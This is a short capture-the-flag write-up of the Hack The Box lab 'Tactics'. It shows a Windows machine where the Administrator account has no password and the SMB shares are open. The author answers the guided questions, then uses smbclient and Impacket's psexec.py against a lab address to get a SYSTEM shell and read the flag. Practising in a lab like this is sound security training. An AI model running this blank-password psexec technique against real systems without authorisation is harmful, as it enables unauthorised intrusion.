>[!tldr] Tactics is a very easy #Windows machine that features misconfigured #SMB shares where an Administrator account without a password allows access to administrative shares. This misconfiguration can be abused manually with the SMB command line interface to retrieve sensitive files, or Impacket's psexec can be used to obtain a SYSTEM-level shell.


# Guided Mode
---
1. `Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?`
	1. This one i know off the top of my head from using `nmap`
- Flag #1 -> `-Pn`

---
2. `What does the 3-letter acronym SMB stand for?`
	1. Quick google search
- Flag #2 -> `Server Message Block`

---
3. `What default port does SMB listen on?`
	1. From my HTB notes i know its either 139 or 445. So i tried both
- Flag #3 -> `445`

---
4. `What command line argument do you give to smbclient to list available shares?`
	1. I had to read the manual for `smbclient`
- Flag #4 -> `-L`

---
5. `What character at the end of a share name indicates it's an administrative share?`
	1. Quick google search
- Flag #5 -> `$`

---
6. `Which Administrative share is accessible on the box that allows users to view the whole file system?`
	1. You have to use `smbclient` to view the shares. You had to assume "Administrator" is active and misconfigured, which is just the low hanging fruit

```shell
❯ smbclient -L '//10.129.53.88/ADMIN$' -U Administrator
do_connect: Connection to 10.129.53.88 failed (Error NT_STATUS_IO_TIMEOUT)
- We cant even access this share
```
- Flag -> `C$`

>[!warning] `smbclient` doesn't work super well on this machine...
---
7. `What command can we use to download the files we find on the SMB Share?`
	1. I just assumed its like `ftp` and uses get, which is right
- Flag #7 -> `get`

---
8. `Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?`
	1. I got this tool from looking at "Option B" of the official walkthroug
- Flag #8 -> `psexec.py`

---
- Root Flag: 

```shell
❯ psexec.py Administrator@10.129.53.88
- psexec works well!  

C:\Windows\system32> cd C:\Users\
- After connecting i changed directories to somewhere i know

C:\Users> dir
<SNIP>
04/21/2021  08:23 AM    <DIR>          Administrator
04/21/2021  08:23 AM    <DIR>          Public
- As we can see, there are two users
  
C:\Users> cd Administrator
- I head to administrator
  
C:\Users\Administrator\Desktop> dir
<SNIP>
04/23/2021  02:39 AM                32 flag.txt
- Heres the flag, lets read it with type
  
C:\Users\Administrator\Desktop> type flag.txt
[REDACTED_FLAG]
```

- Root Flag -> `[REDACTED_FLAG]`